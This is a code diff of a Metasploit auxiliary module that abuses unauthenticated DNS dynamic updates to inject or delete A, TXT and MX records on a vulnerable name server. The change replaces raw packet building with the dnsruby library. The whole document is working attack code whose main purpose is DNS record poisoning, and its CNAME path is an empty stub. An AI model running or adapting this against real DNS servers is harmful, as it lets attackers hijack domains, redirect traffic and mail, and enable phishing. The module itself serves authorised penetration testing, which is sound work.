@@ -4,10 +4,9 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 require 'msf/core'
-require 'net/dns'
+require 'dnsruby'
 
 class MetasploitModule < Msf::Auxiliary
-  include Msf::Exploit::Remote::Udp
 
   def initialize
     super(
@@ -37,140 +36,126 @@ class MetasploitModule < Msf::Auxiliary
             OptAddress.new('NS', [true, 'The vulnerable DNS server IP address']),
             OptString.new('INJECTDOMAIN', [true, 'The name record you want to inject']),
             OptAddress.new('INJECTIP', [true, 'The IP you want to assign to the injected record']),
+            OptEnum.new('TYPE',  [true, 'The record type you want to inject.', 'A', ['A', 'CNAME', 'TXT', 'MX']])
         ], self.class)
-
-    register_advanced_options(
-        [
-            Opt::RPORT(53),
-            OptInt.new('TIMEOUT', [false, 'DNS TIMEOUT', 8]),
-            OptInt.new('RETRY', [false, 'Number of times to try to resolve a record if no response is received', 2]),
-            OptInt.new('RETRY_INTERVAL', [false, 'Number of seconds to wait before doing a retry', 2]),
-            OptBool.new('TCP_DNS', [false, 'Run queries over TCP', false])
-        ], self.class)
-
+    register_advanced_options([
+                                  OptString.new('TXTSTRING', [true, 'The string to be injected with TXT record', 'w00t'])
+                              ])
     deregister_options( 'RHOST', 'RPORT' )
 
   end
 
-
-  # DNS protocol converts domain to string_size+\x03+binary_string. eg. rubyfu.net = \x06rubyfu\x03net
-  def domain_to_raw(domain_name)
-    domain_name.split('.').map do |part|
-      part_size  = '%02x' % part.size
-      domain2hex = part.each_byte.map{|byte| '%02x' %  byte}.join
-      part_size + domain2hex
-    end.join.scan(/../).map { |x| x.hex.chr }.join
-  end
-
-  # Converts IP address to hex format with eliminating the Dots as DNS protocol does.
-  def ip_to_hex(ip_addr)
-    ip_addr.split(".").map(&:to_i).pack("C*")
-  end
-
-  #
-  # Build the DNS update A record query
-  #
-  def build_a_record(action, domain, attacker_domain, attacker_ip)
+  def a_record(action)
+    # Send the update to the zone's primary master.
+    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
+    # Create the update packet.
+    update   = Dnsruby::Update.new(datastore['DOMAIN'])
     case
       when action == 'ADD'
-        _type    = "\x00\x01"           # Type: A (Host Address (0x01)
-        _class   = "\x00\x01"           # Class: IN (0x0001)
-        _ttl     = "\x00\x00\x00\x78"   # Time to live (120)
-        _datalen = "\x00\x04"           # Data length (0x0000)
+        # Prerequisite is that no A records exist for the name.
+        update.absent("#{datastore['INJECTDOMAIN']}.", 'A')
+        # Add two A records for the name.
+        update.add("#{datastore['INJECTDOMAIN']}.", 'A', 86400, datastore['INJECTIP'])
+        begin
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
+        rescue Dnsruby::YXRRSet => e
+          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
+          vprint_error("Update failed: #{e}")
+        end
       when action == 'DEL'
-        _type    = "\x00\xff"           # Type: A request for all records (0x00ff)
-        _class   = "\x00\xff"           # Class: ANY (0x00ff)
-        _ttl     = "\x00\x00\x00\x00"   # Time to live (0x0000)
-        _datalen = "\x00\x00"           # Data length (0x0000)
+        begin
+          update.present(datastore['INJECTDOMAIN'], 'A')
+          update.delete(datastore['INJECTDOMAIN'],  'A')
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
+        rescue Dnsruby::NXRRSet => e
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+          vprint_error "Update failed: #{e}"
+        end
     end
-
-    #
-    # Dynamic Update Query builder
-    #
-
-    # Transaction ID: 0x0000
-    "\x00\x00" +
-    # Flags: 0x2800 Dynamic update
-    "\x28\x00" +
-    # Zones: 1
-    "\x00\x01" +
-    # Prerequisites: 0
-    "\x00\x00" +
-    # Updates: 1
-    "\x00\x01" +
-    # Additional RRs: 0
-    "\x00\x00" +
-    # Zone
-    #   <DOMAIN>: type SOA, class IN
-    #   Name: <DOMAIN> & [Name Length: 8] & [Label Count: 2]
-    domain_to_raw(domain) + "\x00" +
-    #   Type: SOA (Start Of a zone of Authority) (6)
-    "\x00\x06" +
-    #   Class: IN (0x0001)
-    "\x00\x01" +
-
-    # Updates
-    #   <ATTACKER_DOMAIN>: type A, class IN, addr <ATTACKER_DOMAIN>
-    #   Name: <ATTACKER_DOMAIN>
-    domain_to_raw(attacker_domain) + "\x00" +
-    #   Type: _type
-    _type +
-    #   Class: _class
-    _class +
-    #   Time to live: _ttl
-    _ttl +
-    #   Data length: _datalen
-    _datalen +
-    #   Address: <ATTACKER_IP>
-    ip_to_hex(attacker_ip)
   end
-
-  def send_udp
-    datastore['RHOST'] = datastore['NS']
-    datastore['RPORT'] = 53
-    connect_udp
-
-    # Send UDP packet
-    udp_sock.puts(
-        # Build DNS query
-        build_a_record(
-            action.name,
-            datastore['DOMAIN'],
-            datastore['INJECTDOMAIN'],
-            datastore['INJECTIP']
-        )
-    )
-  end
-
-  def run
-
-    print_status("Sending DNS query payload...")
-    send_udp
-
-    # @res = Net::DNS::Resolver.new
-    # @res.retry = datastore['RETRY'].to_i
-    # @res.retry_interval = datastore['RETRY_INTERVAL'].to_i
-    # query = @res.query(datastore['INJECTDOMAIN'], Net::DNS::A)
-    # print_status "#{query.methods}"
-
+  #
+  def cname_record(action)
     case
-      when action.name == 'ADD'
-        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
-        # if resolve == datastore['INJECTIP']
-        print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
-      # else
-      #   print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable.")
-      # end
-
-      when action.name == 'DEL'
-        # resolve = ::Net::DNS::Resolver.start(datastore['INJECTDOMAIN']).answer.first.address.to_s
-        # if resolve.nil?
-        print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
-      # else
-      #   print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
-      # end
+      when action == 'ADD'
+      when action == 'DEL'
     end
+  end
 
+  def txt_record(action)
+    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
+    update   = Dnsruby::Update.new(datastore['DOMAIN'])
+    case
+      when action == 'ADD'
+        update.absent(datastore['INJECTDOMAIN'])
+        update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.TXT, 86400, datastore['TXTSTRING'])
+
+        begin
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['TXTSTRING']}' has been added!")
+        rescue Dnsruby::YXDomain => e
+          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
+          vprint_error("Update failed: #{e}")
+        end
+      when action == 'DEL'
+        begin
+          update.present(datastore['INJECTDOMAIN'], 'TXT')
+          update.delete(datastore['INJECTDOMAIN'],  'TXT')
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['TXTSTRING']}' has been deleted!")
+        rescue Dnsruby::NXRRSet => e
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+          vprint_error "Update failed: #{e}"
+        end
+    end
+  end
+
+  def mx_record(action)
+    resolver = Dnsruby::Resolver.new({:nameserver => datastore['NS']})
+    update   = Dnsruby::Update.new(datastore['DOMAIN'])
+    case
+      when action == 'ADD'
+        # Add A record for MX record
+        a_record(action) rescue $!.class == Dnsruby::YXRRSet  # Avoid 'a_record' exception and keep going
+        update.present(datastore['INJECTDOMAIN'])
+        update.add(datastore['INJECTDOMAIN'], Dnsruby::Types.MX, 10, datastore['INJECTDOMAIN'])
+        begin
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been added!")
+        rescue ::Exception => e
+          print_error("Can't inject #{datastore['INJECTDOMAIN']}. Make sure the DNS server is vulnerable or domain already exists.")
+          vprint_error("Update failed: #{e}")
+        end
+      when action == 'DEL'
+        begin
+          update.present(datastore['INJECTDOMAIN'], 'MX')
+          update.delete(datastore['INJECTDOMAIN'],  'MX')
+          resolver.send_message(update)
+          print_good("The record '#{datastore['INJECTDOMAIN']} => #{datastore['INJECTIP']}' has been deleted!")
+        rescue Exception => e
+          print_error("Can't delete #{datastore['INJECTDOMAIN']}. DNS server is vulnerable or domain doesn't exist.")
+          vprint_error "Update failed: #{e}"
+        end
+    end
+  end
+  # Run
+  def run
+    print_status("Sending DNS query payload...")
+    case
+    when datastore['TYPE'] == 'A'
+      a_record(action.name)
+    when datastore['TYPE'] == 'CNAME'
+      cname_record(action.name)
+      print_warning("Not implemented yet.")
+    when datastore['TYPE'] == 'TXT'
+      txt_record(action.name)
+    when datastore['TYPE'] == 'MX'
+      print_warning("Not implemented yet.")
+      mx_record(action.name)
+    else
+      print_error "Invalid Record Type!"
+    end
   end
 
 end
